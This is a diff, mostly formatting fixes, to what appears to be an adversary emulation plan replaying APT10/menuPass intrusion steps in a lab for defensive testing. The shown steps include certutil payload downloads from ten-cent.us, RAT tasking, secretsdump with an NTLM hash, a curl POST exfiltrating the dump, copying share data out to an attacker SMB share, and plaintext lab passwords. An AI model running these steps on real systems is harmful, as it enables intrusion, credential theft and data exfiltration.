@@ -8,17 +8,19 @@
 
 * Search for Command Prompt and right-click Run As Administrator. Execute the
 following command to start the Quasar C2 server:
+
   ```
   C:\menu_pass\Resources\Quasar\bin\Release\net472\Quasar.exe -c C:\menu_pass\Resources\Quasar\quasar.p12
   ```
 
 * :arrow_right: Initiate an RDP session to the Kali attack host `kraken (176.59.1.18)`
-  
+
 * In a new terminal window, start the evalsC2server, ensuring the following
 handlers are enabled:
   * QuasarRAT
   * SodaMaster
   * Simple file server
+
   ```
   cd menu_pass/Resources/control_server
   sudo go build -o controlServer main.go
@@ -26,6 +28,7 @@ handlers are enabled:
   ```
 
 * Right-click within the terminal window and click "Split Terminal Horizontally". Within the new terminal, change directory to the location of the evalsC2client.py and **use this terminal for tasking implants**.
+
   ```
   cd menu_pass/Resources/control_server
   ```
@@ -45,13 +48,13 @@ victim device using `certutil`. SigLoader is a multi-layer loader that loads
 and decrypts the target payload. Eventually, SigLoader will load the first
 payload, FYAnti, in memory.
 
-FYAnti decrypts the first embedded .NET module and executes the module using 
+FYAnti decrypts the first embedded .NET module and executes the module using
 the `CppHostCLR` technique to avoid dropping additional files to disk. When
 executed, the first embedded .NET module then enumerates files to find the
 QuasarRAT .NET module on disk, decrypts it, and then executes it.
 
 QuasarRAT, which has been modified and heavily obfuscated, checks first for
-internet connectivity then connects to the C2 server using a redirector at 
+internet connectivity then connects to the C2 server using a redirector at
 `notepad-plusplus-updates[.]com (121.93.4.32)`.
 
 ### ☣️ Procedures
@@ -73,6 +76,7 @@ stolen system credentials, RDP to the IIS Server `gabumon (10.10.10.9)`.
   certutil.exe -urlcache -f http://ten-cent.us/files/mshtml.wpf.wfx %SYSTEMROOT%\Microsoft.NET\mshtml.wpf.wfx
   certutil.exe -urlcache -f http://ten-cent.us/files/ngen.old2.log %SYSTEMROOT%\Microsoft.NET\Framework64\v4.0.30319\ngen.old2.log
   ```
+
   * Note:
     * `VERSION.dll` is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer1.dll
     * `skt.dll` is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer2.dll
@@ -85,6 +89,7 @@ FYAnti and FYAnti will load QuasarRAT.
   ```
   "C:\Program Files\Notepad++\notepad++.exe"
   ```
+
   * **NOTE:** the current working directory should be `C:\Windows\System32`. This is where the Quasar `clientmanagement.log` will be dropped.
 
 * Confirm C2 registration of QuasarRAT
@@ -92,13 +97,14 @@ FYAnti and FYAnti will load QuasarRAT.
 * **Minimize** Notepad++ and close out of all other windows, then disconnect from the RDP session (do not sign out)
 
 ### :mag: Reference Code & Reporting
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://www.lac.co.jp/lacwatch/report/20201201_002363.html
+
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -131,7 +137,6 @@ FYAnti and FYAnti will load QuasarRAT.
 
 <br>
 
-
 ## Step 2 - Initial Discovery
 
 ### :microphone: Voice Track
@@ -143,23 +148,26 @@ domain controller on Subsidiary A’s network.
 ### ☣️ Procedures
 
 * Using QuasarRAT, download the PowerShell discovery script to the IIS Server
+
   ```
   ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\step2discovery.ps1", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1"}'
   ```
 
 * Using QuasarRAT, execute the PowerShell discovery script
+
   ```
   ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 1, "proc_path":"powershell.exe", "proc_args": "\"C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1\""}'
   ```
 
 ### :mag: Reference Code & Reporting
-1. https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
-1. https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-
-1. https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10
+
+1. <https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor>
+1. <https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934>
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt->
+1. <https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -177,7 +185,6 @@ domain controller on Subsidiary A’s network.
  </details>
 
 <br>
-
 
 ## Step 3 - Credential Access and Privilege Escalation
 
@@ -206,10 +213,13 @@ admin's credentials.
 >   | DIGIRUNAWAY\kizumi | ydJEeqNzN4Xqkd9h@ |
 >
 > * Open Command Prompt with administrative privileges, execute cmd via `runas` with their Domain Admin username, **typing the password when prompted**:
+>
 >    ```
 >    runas /user:DIGIRUNAWAY\kizumi.da cmd
 >    ```
->    * **Type, DO NOT copy and paste,** the following when prompted:
+>
+>   * **Type, DO NOT copy and paste,** the following when prompted:
+>
 >       ```
 >       ydJEeqNzN4Xqkd9h@
 >       ```
@@ -235,6 +245,7 @@ stolen credentials from Step 1.
 * Within the RDP to the IIS server `gabumon (10.10.10.9)`, open Command Prompt
 with administrative privileges (if not already open) then execute the following
 runas command, entering the kizumi.da password when prompted:
+
   ```
   runas /netonly /user:DIGIRUNAWAY\kizumi.da cmd.exe
   ```
@@ -245,14 +256,14 @@ runas command, entering the kizumi.da password when prompted:
 
 ### :mag: Reference Code & Reporting
 
-1. https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
-1. https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934
-1. https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-
+1. <https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor>
+1. <https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934>
+1. <https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10>
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt->
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -271,7 +282,6 @@ runas command, entering the kizumi.da password when prompted:
  </details>
 
 <br>
-
 
 ## Step 4 - Lateral Movement to Subsidiary A Domain Controller
 
@@ -296,21 +306,25 @@ This second QuasarRAT implant will connect to the C2 server using a redirector a
 * Using the QuasarRAT on the IIS Server `gabumon (10.10.10.9)`, download a second copy of
 SigLoader/QuasarRAT components. **Wait until each command has returned before executing the next**.
   * SigLoader layer 1
+
     ```
     ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer1.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\VERSION.dll"}'
     ```
 
   * SigLoader layer 2
+
     ```
     ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer2.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\nhi.dll"}'
     ```
 
   * FYAnti
+
     ```
     ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_fyanti.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\mshtmled.wpf.cfg"}'
     ```
 
   * QuasarRAT
+
     ```
     ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\Client.exe.enc", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\ngen.old3.log"}'
     ```
@@ -346,9 +360,10 @@ remotely run the scheduled task created on the Subsidiary A Domain Controller
 * Confirm C2 registration of a second QuasarRAT implant.
 
 ### :mag: Reference Code & Reporting
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
+
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -451,23 +466,28 @@ Recycle Bin (`C:\$Recycle.Bin\S-1-5-21-156812349-472333277-3174882868-1109\$RCXN
 `parrotmon (10.10.10.4)`, execute nslookup against the active hosts. **Wait until each command has returned before executing the next**.
 
   1. `phantomon`
+
         ```
         ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.11"}'
         ```
+
   2. `ghostmon`
+
         ```
         ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.22"}'
         ```
+
   3. `cecilmon`
+
         ```
         ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"nslookup.exe", "proc_args": "10.10.20.23"}'
         ```
 
 ### :mag: Reference Code & Reporting
 
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -488,7 +508,6 @@ Recycle Bin (`C:\$Recycle.Bin\S-1-5-21-156812349-472333277-3174882868-1109\$RCXN
  </details>
 
 <br>
-
 
 ## Step 6 - Preparation for Lateral Movement onto Subsidiary B Network
 
@@ -520,7 +539,7 @@ the active hosts
   ```
   ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(objectCategory=computer)\" -attr *"}'
   ```
-  
+
 * Using the QuasarRAT implant on the Subsidiary A Domain Controller
 `parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
 trusted domains
@@ -528,11 +547,13 @@ trusted domains
   ```
   ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"dsquery.exe", "proc_args": "* -filter \"(objectCategory=trusteddomain)\" -attr *"}'
   ```
+
   * Ensure `DIGIREVENGE` is listed as a trusted domain
+
   ```
   grep 'flatname: digirevenge' logs.txt -ia -C 10
   ```
-  
+
 * Using the QuasarRAT implant on the Subsidiary A Domain Controller
 `parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
 the active hosts within DIGIREVENGE
@@ -546,7 +567,7 @@ the active hosts within DIGIREVENGE
   ```
   grep 'Workstation Contractor Bastion' logs.txt -ia
   ```
-  
+
 * Using the QuasarRAT implant on the Subsidiary A Domain Controller
 `parrotmon (10.10.10.4)`, execute `dsquery` to enumerate further information on
 the users within DIGIREVENGE
@@ -561,16 +582,19 @@ the users within DIGIREVENGE
 `kimeramon (10.20.20.11)`. **Wait until each command has returned before
 executing the next**.
   * SigLoader layer 1
+
     ```
     ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer1.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\C$\\Program Files\\Notepad++\\VERSION.dll"}'
     ```
 
   * SigLoader layer 2
+
     ```
     ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\bastion_layer2.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\admin$\\System32\\hkp.dll"}'
     ```
 
   * SodaMaster
+
     ```
     ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\sodamaster.dll", "transfer_dst": "\\\\kimeramon.digirevenge.net\\admin$\\System32\\win64_tools.dll"}'
     ```
@@ -586,13 +610,13 @@ SigLoader
 
 ### :mag: Reference Code & Reporting
 
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://www.lac.co.jp/lacwatch/report/20201201_002363.html
-1. https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>
+1. <https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -627,14 +651,14 @@ that will sideload SigLoader.
 On execution, SigLoader will again perform its layered loading, with the final
 loaded payload this time being SodaMaster. Once SodaMaster is executed, it will
 perform the following initialization steps:
-- Perform automated host discovery
-- Execute anti-sandbox checks
-- Add itself to Windows Defender's whitelist
-- Check Defender configurations
-- Establish C2 communication using a redirector at
+* Perform automated host discovery
+* Execute anti-sandbox checks
+* Add itself to Windows Defender's whitelist
+* Check Defender configurations
+* Establish C2 communication using a redirector at
 `notepad-plusplus[.]eu (121.93.44.121)`
 
-Eventually, a file server administrator `kmimi` from 
+Eventually, a file server administrator `kmimi` from
 Subsidiary B's network RDPs in to the bastion workstation `kimeramon (10.20.20.11)`
 to perform tasks then disconnects from their session when complete.
 
@@ -646,6 +670,7 @@ created service
   ```
   ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"seq": 1, "type": 1, "proc_path": "sc.exe", "proc_args": "\\\\kimeramon.digirevenge.net start Notepad"}'
   ```
+
   * This command should return `FAILED 1053`. This is expected because
   notepad++.exe is not configured as a service binary that would properly
   respond to the service manager. However, notepad++.exe *will still execute*
@@ -662,11 +687,13 @@ created service
 >   | DIGIREVENGE\kmimi | cHjc3p3hJHJYPUzT@ |
 >
 > * Open Command Prompt, mount the file share:
+>
 >    ```
 >    net use F: \\10.20.10.23\F$ /persistent:yes
 >    ```
 >
 > * Check the drive was mounted properly:
+>
 >    ```
 >    net use
 >    ```
@@ -677,13 +704,13 @@ created service
 
 ### :mag: Reference Code & Reporting
 
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://www.lac.co.jp/lacwatch/report/20201201_002363.html
-1. https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>
+1. <https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -738,45 +765,52 @@ plaintext password.
 
 * Using SodaMaster, execute the discovery actions shellcode. **Wait until each command has returned before executing the next.**
   * `netstat -anop tcp`
-    
+
     ```
     ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"netstat -anop tcp"}'
     ```
+
     * :heavy_exclamation_mark: Verify a network connection to `alphamon (10.20.10.23)` port 445
 
   * `tasklist /v`
-    
+
     ```
     ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"tasklist /v"}'
     ```
+
     * :heavy_exclamation_mark: Verify that the enumerated processes output contains a process running under `kmimi`
-    
+
   * `net view 10.20.10.23 /all`
-    
+
     ```
     ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"net view 10.20.10.23 /all"}'
     ```
+
     * :heavy_exclamation_mark: Verify the output contains a list of file shares with the file server host `alphamon (10.20.10.23)`
-    
+
   * `net user kmimi /domain`
-    
+
     ```
     ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"net user kmimi /domain"}'
     ```
+
     * :heavy_exclamation_mark: Verify that `File Server Admins` is listed as one of the groups that `kmimi` is a member of
 
 * Using SodaMaster, download and execute `secretsdump.exe`, using the NTLM hash for `kizumi.da`
 collected in step 5
+
   ```
   ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "payload":"secretsdump.exe", "payloadPath":"C:/Windows/Temp", "args":"C:/Windows/Temp/secretsdump.exe digirunaway/kizumi.da@127.0.0.1 -hashes :6265fbabbdaa3ee71df61bd9f3c77d68 > C:/Windows/Temp/tmp4541 && echo Done"}'
   ```
 
 * Using SodaMaster, curl the secretsdump output to exfiltrate the file
+
     ```
     ./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{"id":"s", "args":"curl -X POST -H 'filename:sdump.txt' --data-binary @C:/Windows/Temp/tmp4541 http://ten-cent.us/uploads"}'
     ```
 
 * Confirm secretsdump output file was exfiltrated in the C2 server log then check for presence of a cached domain login for `kmimi` in the output:
+
     ```
     cat files/sdump.txt | grep -a kmimi
     ```
@@ -785,12 +819,13 @@ collected in step 5
 > for `kmimi`
 
 ### :mag: Reference Code & Reporting
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks
-1. https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf
+
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks>
+1. <https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
@@ -840,6 +875,7 @@ on the file server and command history.
 * :arrow_right: Return to the RDP session on the Kali attack host `kraken (176.59.1.18)`
 
 * Open a terminal window and start the SMB server:
+
   ```
   sudo mkdir /opt/menu_pass/digirevenge
   sudo impacket-smbserver digirevenge /opt/menu_pass/digirevenge -smb2support
@@ -859,7 +895,7 @@ using the file server administrator `kmimi` credentials to authenticate.
   | -------- | -------- |
   | DIGIREVENGE\kmimi | cHjc3p3hJHJYPUzT@ |
 
-* Using the RDP session, open a Command Prompt 
+* Using the RDP session, open a Command Prompt
 then execute `WMIexec.vbs` with the file server administrator `kmimi`
 credentials targeting the file server `alphamon (10.20.10.23)`
 
@@ -887,6 +923,7 @@ each file path containing files of interest
   ```
   cd "C:\Program Files"
   ```
+
   ```
   conhost.exe a -r C:\Windows\Temp\wmilog.rar F:\data
   ```
@@ -900,6 +937,7 @@ adversary controlled SMB share
   ```
 
 * :arrow_right: Switch to an open terminal in Kali and confirm the exfiltration was successful
+
     ```
     ls -l /opt/menu_pass/digirevenge
     ```
@@ -916,17 +954,17 @@ clear Windows event logs
   ```
   exit
   ```
-  
+
 * Close the Command Prompt then disconnect from the RDP session
 
 ### :mag: Reference Code & Reporting
 
-1. https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
-1. http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
-1. https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf
-1. https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks
-1. https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf
+1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
+1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
+1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
+1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks>
+1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
 
  <details>
    <summary>:link: Click to expand source code links table</summary>
